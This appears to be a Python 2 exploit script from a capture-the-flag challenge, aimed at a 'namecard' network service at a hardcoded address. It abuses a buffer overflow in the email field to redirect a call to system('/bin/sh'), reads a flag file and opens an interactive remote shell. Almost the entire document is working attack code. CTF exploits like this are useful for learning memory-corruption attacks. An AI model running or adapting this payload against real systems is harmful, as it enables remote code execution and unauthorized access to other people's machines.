from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

def remote_debug(flag):
    if(flag == True):
        print"[+] Remote debugging mode"
        time.sleep(10)
        raw_input("Dbg is ready?")

# nc 119.81.253.14 32770
host = 'localhost'
host = '119.81.253.14'
port = 32770

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

if len(sys.argv) == 2:
	remote_debug(True)
else:
	remote_debug(False)

# Create new namecard
recv_until(s, "5: Exit\n")
s.send("1\n")
s.send("2\n")
s.send("AAAA".ljust(20,"\x00"))

system_addr = 0x80484f0
payload = ""
payload+= "CCCC"
payload+= pack("<L", system_addr)
payload+= "B" * (80-len(payload))
'''
printf("email?: ");
read(0, &s, 100u);			  // Read 100 bytes, not 80 bytes
dest[100] = 1;
strcpy_wrapper(dest, (char *)&buf, 20);
strcpy_wrapper(dest + 20, &s, 80);	  // dest[100] can be set to NULL

Here, we can overwrite dest[100] to NULL (master's gender)
'''
s.send(payload.ljust(99,"\x00") + "\n")

# Trigger the bug, we can call arbitrary function 
recv_until(s, "5: Exit\n")
s.send("2\n")
s.send("0\n")
s.send("/bin/sh\x00\n")

print "[+] You got a shell!"
s.send("cat /home/mg/flag\x00\n")

try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass
